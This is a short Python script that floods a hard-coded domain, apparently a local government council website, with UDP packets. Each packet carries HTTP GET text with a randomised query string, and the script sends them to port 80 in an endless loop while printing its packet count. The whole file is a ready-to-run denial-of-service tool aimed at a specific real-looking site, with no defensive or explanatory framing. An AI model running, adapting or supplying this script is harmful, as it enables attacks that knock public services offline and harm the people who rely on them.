import socket
import random
import urllib.parse
from colorama import init, Fore

# Initialize colorama
init()

def generate_packet(target_url):
    packet = f"GET /?{random.randint(0, 9999)} HTTP/1.1\n"
    packet += f"Host: {target_url}\n"
    packet += "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36\n"
    packet += "Accept-Language: en-US,en;q=0.5\n"
    return packet.encode()

def send_packet(target_port):
    target_url = "http://www.damodar.unionporishad.com/"
    try:
        parsed_url = urllib.parse.urlparse(target_url)
        if not parsed_url.hostname:
            print(Fore.RED + "Invalid URL. Please enter a valid URL.")
            return
        target_ip = socket.gethostbyname(parsed_url.hostname)
    except socket.gaierror:
        print(Fore.RED + "Failed to resolve the target IP address.")
        return
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = generate_packet(parsed_url.hostname)

    num_packets = 0
    interval = 100000

    try:
        while True:
            sock.sendto(packet, (target_ip, target_port))
            num_packets += 1
            if num_packets == 1 or (num_packets > 1 and num_packets % interval == 0):
                print(Fore.GREEN + f"I sent {num_packets} packet(s).")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nTerminating the script upon user interruption...")

# Run the script
target_port = 80
send_packet(target_port)
